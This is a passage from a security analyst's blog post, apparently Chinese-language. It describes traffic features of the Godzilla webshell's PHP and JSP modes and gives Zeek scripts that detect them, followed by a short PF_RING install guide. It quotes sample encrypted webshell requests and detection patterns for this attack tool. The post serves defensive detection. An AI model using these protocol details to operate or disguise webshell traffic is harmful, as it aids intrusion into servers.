<h1 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h1><p>​        结合上面的分析，传统通过静态特征的匹配方式已不在适用于Godzilla WebShell检测。不过，我们可以将多个特征进行结合实现一个检测的模型来对Godzilla PHP XOR BASE64 WebShell的检测。下面我们来列举一下检测特征：</p>
<ol>
<li><p><strong>频率</strong></p>
<p>Godzilla连接WebShell的时会在一次TCP会话中发起<strong>3</strong>次HTTP POST请求。</p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req.png" alt="image-20211206111919028"></p>
<p>​    注意看下<code>uid</code>均为<code>CbhiAefsstFeAyCM6</code>表示是一次TCP会话请求。</p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_uid.png" alt="image-20211206114412112"></p>
</li>
</ol>
<ol start="2">
<li><p><strong>长度</strong></p>
<p>Godzilla虽然对传输时的<code>payload</code>进行了加密，但是初始连接时3次请求中的内容是固定的，所以通过XOR + BASE64编码后的长度是不变的。</p>
<ul>
<li><p>第一次请求长度（<strong>Value</strong>）：<strong>52216</strong></p>
<p>​    Godzilla加载payload.php文件内容作为<code>payload</code>数据，其中定义了Shell功能所需的一系列函数，Godzilla第一次连接Shell时，会将这些函数定义发送给服务器并存储在session中，后续的Shell操作只需要发送函数名称以及对应的函数参数即可。</p>
</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/PHP-Payload.png" alt="image-20211204004016084"></p>
<ul>
<li><p>第一次响应长度：<strong>0</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_resp.png" alt="image-20211204005107879"></p>
</li>
<li><p>第二次请求长度（<strong>Value</strong>）：<strong>28</strong></p>
<ul>
<li>密文： <code>CQNGDVtRLFJcUmEwNTg1FgEVRg==</code></li>
<li>明文：<code>&#123;&#39;methodName&#39;: &#39;test&#39;&#125;</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_req.png" alt="image-20211204010342657"></p>
</li>
<li><p>第二次响应长度：<strong>64</strong></p>
<ul>
<li>密文：<code>e+06ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==</code></li>
<li>明文：<code>ok</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp.png" alt="image-20211204011821599"></p>
</li>
<li><p>第三次请求长度（<strong>Value</strong>）：<strong>40</strong></p>
<ul>
<li>密文：<code>CQNGDVtRLFJcUmE5NTg1BQEScARHXAFAeFkFWw==</code></li>
<li>明文：<code>&#123;&#39;methodName&#39;: &#39;getBasicsInfo&#39;&#125;</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_req.png" alt="image-20211204012318391"><em>注：第三次响应数据包，不可作为特征提取。因为每个服务器的基础信息不一样，所以返回内容长度也不一样。</em></p>
</li>
</ul>
</li>
<li><p><strong>内容</strong></p>
<p>有的小伙伴会奇怪，都已经加密了还能从内容上做哪些判断。其实还是可以有的，只不过并不是传统的“威胁特征”</p>
<ul>
<li>请求：3次请求中的key均<strong>相等</strong>，此例中为：<code>Happy</code></li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-1_req_key.png" alt="image-20211206111328799"></p>
<ul>
<li>响应：响应数据包中首尾各16位数值可满足MD5的提取<code>[a-z0-9]&#123;16&#125;.+[a-z0-9]&#123;16&#125;</code>，且2次响应包中的16位数值均<strong>相等</strong>；</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-2_resp_md5.png" alt="image-20211206105322612"></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Connect-3_resp_md5.png" alt="image-20211206110509962"></p>
</li>
</ol>
<h1 id="检测模型"><a href="#检测模型" class="headerlink" title="检测模型"></a>检测模型</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/image.jpeg" alt="image-20211208151817057"></p>
<h2 id="PHP-XOR-BASE64-1"><a href="#PHP-XOR-BASE64-1" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_PHP_XOR_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">## 使用Summary Statistics Framework（统计框架）对http请求进行测量。</span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (c?$http) &amp;&amp; (c$http?$status_code) &amp;&amp; (c$http?$method) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      ## 第一步，创建一个观察器，将数据添加到观察器中。</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ## 第二步，根据指定的观察流进行处理，此处采用计算唯一值的方式。</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  ## 第三步，创建汇总统计，以便最终对其进行处理。例：当在<span class="number">3</span>秒的时间窗内满足<span class="number">3</span>次阈值将会执行以下逻辑；</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_php_xor_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">3</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_php_xor_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## 获取请求参数</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              ## 本例中: Happy=CQNGDVtRLFJcUmEwNTg1FgEVRg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            ## 响应体长度 &gt; <span class="number">0</span>，提取首位各<span class="number">16</span>字节并检查是否满足MD5格式</span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              ## 本例中: <span class="number">52f</span>0f23a94a8a3f0e+<span class="number">06</span>ZTQ1YjMxNKj7Mzhyv7gfMGU0NQ==<span class="number">468e329</span>e21eb39e8</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_all_ordered(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              <span class="keyword">if</span> (|server_body_md5| == <span class="number">0</span>)</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                              add md5_str_set[server_body_str];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 &gt; <span class="number">52216</span> &amp;&amp; 响应体长度 = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">52216</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">28</span> &amp;&amp; 响应体长度 = <span class="number">64</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">28</span>) &amp;&amp; (|server_body| == <span class="number">64</span>) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">40</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">40</span> )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                          &#123;</span><br><span class="line">                            ## 判断<span class="number">3</span>次请求参数是否唯一</span><br><span class="line">                            ## 判断后<span class="number">2</span>次提取的MD5值是否唯一</span><br><span class="line">                            <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_PHP_XOR_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(PHP_XOR_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSP-AES-BASE64-1"><a href="#JSP-AES-BASE64-1" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/sumstats</span><br><span class="line"></span><br><span class="line">redef <span class="class"><span class="keyword">enum</span> <span class="title">Notice</span>:</span>:Type += </span><br><span class="line">  &#123;</span><br><span class="line">    WebShell_Godzilla_JSP_AES_BASE64</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">http_message_done</span><span class="params">(c: connection, is_orig: <span class="keyword">bool</span>, stat: http_message_stat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( c?$http &amp;&amp; c$http?$status_code &amp;&amp; c$http?$method )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (c$http$status_code) == <span class="number">200</span> &amp;&amp; (c$http$method == <span class="string">&quot;POST&quot;</span>) &amp;&amp; (c$http?$client_body) )</span><br><span class="line">    &#123;</span><br><span class="line">      local key_str: <span class="built_in">string</span> = c$http$uid + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_h) + <span class="string">&quot;#####&quot;</span> + cat(c$id$orig_p) + <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_h)+ <span class="string">&quot;#####&quot;</span> + cat(c$id$resp_p) + <span class="string">&quot;#####&quot;</span> + c$http$uri;</span><br><span class="line">      local observe_str: <span class="built_in">string</span> = cat(c$http$ts) + <span class="string">&quot;#####&quot;</span> + c$http$client_body + <span class="string">&quot;#####&quot;</span> + c$http$server_body + <span class="string">&quot;#####&quot;</span> + cat(c$http$request_body_len);</span><br><span class="line">      SumStats::observe(<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, [$str=key_str], [$str=observe_str]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  local r1 = SumStats::Reducer($stream = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>, $apply = <span class="built_in">set</span>(SumStats::UNIQUE));</span><br><span class="line">  SumStats::create([$name = <span class="string">&quot;godzilla_jsp_aes_base64_webshell_event.unique&quot;</span>,</span><br><span class="line">                    $epoch = <span class="number">5</span>sec,</span><br><span class="line">                    $reducers = <span class="built_in">set</span>(r1),</span><br><span class="line">                    $threshold = <span class="number">3.0</span>,</span><br><span class="line">                    $threshold_val(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                      <span class="keyword">return</span> result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$num + <span class="number">0.0</span>;</span><br><span class="line">                      &#125;,</span><br><span class="line">                    $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique == <span class="number">3</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          local sig1: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig2: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local sig3: <span class="keyword">bool</span> = F;</span><br><span class="line">                          local pass_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local md5_str_set: <span class="built_in">set</span>[<span class="built_in">string</span>];</span><br><span class="line">                          local key_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(key$str, /#####/);</span><br><span class="line"></span><br><span class="line">                          <span class="keyword">for</span> ( value in result[<span class="string">&quot;godzilla_jsp_aes_base64_webshell_event&quot;</span>]$unique_vals )</span><br><span class="line">                          &#123;</span><br><span class="line">                            local observe_str_vector: <span class="built_in">vector</span> of <span class="built_in">string</span> = split_string(value$str, /#####/);</span><br><span class="line">                            local client_body = unescape_URI(observe_str_vector[<span class="number">1</span>]);</span><br><span class="line">                            local server_body = unescape_URI(observe_str_vector[<span class="number">2</span>]);</span><br><span class="line">                            local client_body_len = to_int(observe_str_vector[<span class="number">3</span>]);</span><br><span class="line">                            local offset = <span class="built_in">strstr</span>(client_body, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                            local client_body_value = client_body[offset: |client_body|];</span><br><span class="line"></span><br><span class="line">                            ## 获取 WebShell Password Key</span><br><span class="line">                            <span class="keyword">if</span> (offset &gt; <span class="number">1</span>)</span><br><span class="line">                              add pass_str_set[client_body[<span class="number">0</span>: offset<span class="number">-1</span>]];</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (|server_body| &gt; <span class="number">0</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                              local server_body_str = server_body[<span class="number">0</span>: <span class="number">16</span>] + server_body[<span class="number">-16</span>: ];</span><br><span class="line">                              local server_body_md5 = find_last(server_body_str, /[a-zA-Z0<span class="number">-9</span>]&#123;<span class="number">32</span>&#125;/);</span><br><span class="line">                              add md5_str_set[server_body_md5];</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 &gt; <span class="number">48500</span> &amp;&amp; 响应体长度 = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">if</span> ( (client_body_len &gt; <span class="number">48500</span>) &amp;&amp; (|server_body| == <span class="number">0</span>) )</span><br><span class="line">                              sig1 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">64</span> &amp;&amp; 响应体长度 = <span class="number">76</span></span><br><span class="line">                            <span class="keyword">if</span> ( (|client_body_value| == <span class="number">64</span>) &amp;&amp; (|server_body| == <span class="number">76</span>) &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig2 = T;</span><br><span class="line"></span><br><span class="line">                            ## 请求体长度 = <span class="number">88</span></span><br><span class="line">                            <span class="keyword">if</span> ( |client_body_value| == <span class="number">88</span> &amp;&amp; (server_body_str == server_body_md5) )</span><br><span class="line">                              sig3 = T;</span><br><span class="line">                          &#125;</span><br><span class="line"></span><br><span class="line">                          ## 判断<span class="number">3</span>次请求体中Password Key 是否唯一、判断<span class="number">2</span>、<span class="number">3</span>次的响应体中的是否MD5是否唯一</span><br><span class="line">                          <span class="keyword">if</span> ( (|pass_str_set| == <span class="number">1</span>) &amp;&amp; (|md5_str_set| == <span class="number">1</span>) )</span><br><span class="line">                            <span class="keyword">if</span> ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )</span><br><span class="line">                            &#123;</span><br><span class="line">                              NOTICE([</span><br><span class="line">                                $note=WebShell_Godzilla_JSP_AES_BASE64,</span><br><span class="line">                                $uid=key_str_vector[<span class="number">0</span>],</span><br><span class="line">                                $src=to_addr(key_str_vector[<span class="number">1</span>]),</span><br><span class="line">                                $dst=to_addr(key_str_vector[<span class="number">3</span>]),</span><br><span class="line">                                $msg=fmt(<span class="string">&quot;[+] Godzilla(JSP_AES_BASE64) traffic Detected, %s:%s -&gt; %s:%s, WebShell URI: %s&quot;</span>, key_str_vector[<span class="number">1</span>], key_str_vector[<span class="number">2</span>], key_str_vector[<span class="number">3</span>], key_str_vector[<span class="number">4</span>], key_str_vector[<span class="number">5</span>]),</span><br><span class="line">                                $sub=cat(<span class="string">&quot;Godzilla traffic Detected&quot;</span>)</span><br><span class="line">                              ]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="模型验证"><a href="#模型验证" class="headerlink" title="模型验证"></a>模型验证</h1><p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla-v4_Detected.gif" alt="Godzilla v4 Detected"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/08/16/%E5%AE%89%E8%A3%85-PF-RING/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/08/16/%E5%AE%89%E8%A3%85-PF-RING/" class="post-title-link" itemprop="url">安装-PF_RING</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-08-16 10:33:42 / 修改时间：14:20:52" itemprop="dateCreated datePublished" datetime="2021-08-16T10:33:42+08:00">2021-08-16</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NIDS/" itemprop="url" rel="index"><span itemprop="name">NIDS</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>808</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>1 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Installing from GIT</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># Kernel Module Installation</span></span><br><span class="line">$ <span class="built_in">cd</span> /opt/PF_RING/kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running PF_RING</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/kernel</span><br><span class="line">$ sudo insmod pf_ring.ko min_num_slots=65536 enable_tx_capture=0</span><br><span class="line"><span class="comment"># sudo insmod ./pf_ring.ko [min_num_slots=N] [enable_tx_capture=1|0] [ enable_ip_defrag=1|0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Drivers</span></span><br><span class="line">$ ethtool -i eth1 | grep driver</span><br><span class="line">driver: ixgbe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Libpfring and Libpcap Installation</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/lib</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ <span class="built_in">cd</span> ../libpcap</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># Application Examples</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/examples</span><br><span class="line">$ make</span><br><span class="line">$ sudo ./pfcount -i zc:eth1</span><br><span class="line">$ sudo ./pfsend -f 64byte_packets.pcap -n 0 -i zc:eth1 -r 5</span><br></pre></td></tr></table></figure>



